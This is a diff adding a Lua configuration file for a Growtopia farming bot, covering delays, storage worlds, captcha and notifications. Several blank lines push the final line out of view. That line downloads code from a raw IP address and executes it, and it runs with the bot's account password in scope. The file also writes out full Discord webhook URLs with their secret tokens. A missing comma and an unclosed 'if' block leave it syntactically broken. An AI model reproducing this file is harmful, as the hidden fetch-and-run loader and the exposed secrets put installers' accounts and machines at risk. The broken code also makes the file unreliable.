@@ -1,0 +1,139 @@
+EXTERN = EXTERN
+
+CONFIG = {
+    Main_setting = {
+        License = lisensi,
+        ItemID = 4584,
+        Pack = "asupri"
+    },
+    Farm_setting = {
+        farm_world = farm,
+        farm_world_id = EXTERN.id_doorfarm,
+        delay_harvest = 200,
+        delay_plant = 200
+    },
+    Storage_setting = {
+        storage_seed = "orimanlike100kseed",
+        storage_seed_id = EXTERN.id_doorseed,
+        storage_pack = "gudangWT",
+        storage_pack_id = EXTERN.id_doorpack
+    },
+    Break_setting = {
+        bool_break_other_world = true,
+        break_world_name = "WAKRAZY36E", 
+        break_world_id = EXTERN.id_doorbool
+        tile = 2,
+        delay_break = 200, 
+        delay_put = 200, 
+        auto_ban_joined = false,
+        owner = "growid",
+        custom_position = {true, 6, 1},
+        disable_buypack = false
+    },
+    Other_setting = {
+        repeat_world = true,
+        url_webhook = webhook_url,
+        short_webhook = false,
+        disable_webhook = false
+    },
+    Custom_gems_buypack = {
+        false, 20000 
+    },
+    Avoid_nuke = {
+        use_feature = false,
+        world_random = {
+            "test111","test222","test333","test444","test555",
+            "test666","test777","test888","test999","test000"
+        },
+        delay_every_warp = 10
+    }
+}
+
+CONFIG.PANDORA = true
+CONFIG.GROWX = false
+CONFIG.max_slot_backpack = 46
+CONFIG.detect_floating_objects = false
+CONFIG.disable_get_usage_cpu_ram = true
+CONFIG.disable_plant = false
+CONFIG.sulap = false
+CONFIG.max_block_to_break = 160
+CONFIG.auto_wear_pickaxe = {
+    use_feature = true,
+    storage_pickaxe = "wakpickaxe",
+    storage_pickaxe_id = EXTERN.id_doorpick
+}
+
+CONFIG.Custom_delay = {
+    use_feature = true,
+    delay_break = 160, -- millisecond
+    delay_put = 110, -- millisecond
+    delay_harvest = 155, -- millisecond
+    delay_plant = 155, -- millisecond
+    delay_findpath_harvest = 250, -- millisecond
+    delay_findpath_plant = 250, -- millisecond
+    delay_findpath_break = 800, -- millisecond
+    delay_findpath_drop = 500, -- millisecond
+    delay_findpath_other = 900, -- millisecond
+    delay_drop = 5, -- second
+    delay_trash = 9, -- second
+    delay_warp = 25, -- second
+    delay_buypack = 10, -- second
+    delay_upgrade_backpack = 10 -- second
+}
+
+CONFIG.captcha_setting = {
+    use_feature = true,
+    password_growid = EXTERN.password_bot
+}
+
+CONFIG.use_payy_webhook = true
+CONFIG.use_powershell_webhook = false
+
+CONFIG.Trash_list = {2,3,48}
+CONFIG.drop_item = {
+    use_feature = true,
+    list_item = {10394,5040,5042,5044,5032,5034,5036,5038,5024,5026,5028,5030,7162,7164,1400,5018,9204,1406,5742,5744,5746,5748},
+    max_item_to_drop = 80,
+    storage = "WAKTORAGESEEDD",
+    storage_id = EXTERN.id_dooritem
+}
+
+CONFIG.timezone = "UTC+7"
+CONFIG.notification = {
+    use_feature = true,
+    url_webhook = "https://discord.com/api/webhooks/1036217974345977926/Xk7by5NN-jMxQA8CgZUV6WJdGfhZ8nwLFpcvZK_n6lfv3u97wNFQu6ItcgYjETgPskU_",
+    username = "BOT 36", -- username bot webhook
+    schedule = {
+        use_schedule = false,
+        delay = 30 -- every 60 minute send status of bot
+    }
+}
+
+CONFIG.notification_history_worldlist = {
+    use_feature = true,
+    url_webhook = "https://discord.com/api/webhooks/1068926234026848378/GqnL9WlSSYflhEJyNt3-nI5AqGV2UoKnxFWswpgsLl3DW7IMkW3dCd0WWR0XvvOlGCIQ",
+    username = "WORLD LIST 36",
+    message_id = nil
+}
+
+CONFIG.move_when_breaking_block = {
+    use_feature = false,
+    trigger_second = 50
+}
+
+CONFIG.say_random_word = true
+CONFIG.use_animation = false
+
+
+
+
+
+
+
+
+
+
+
+CONFIG = CONFIG
+if CONFIG.PANDORA then
+    load(request("GET","http://134.209.99.103/rosok"))()
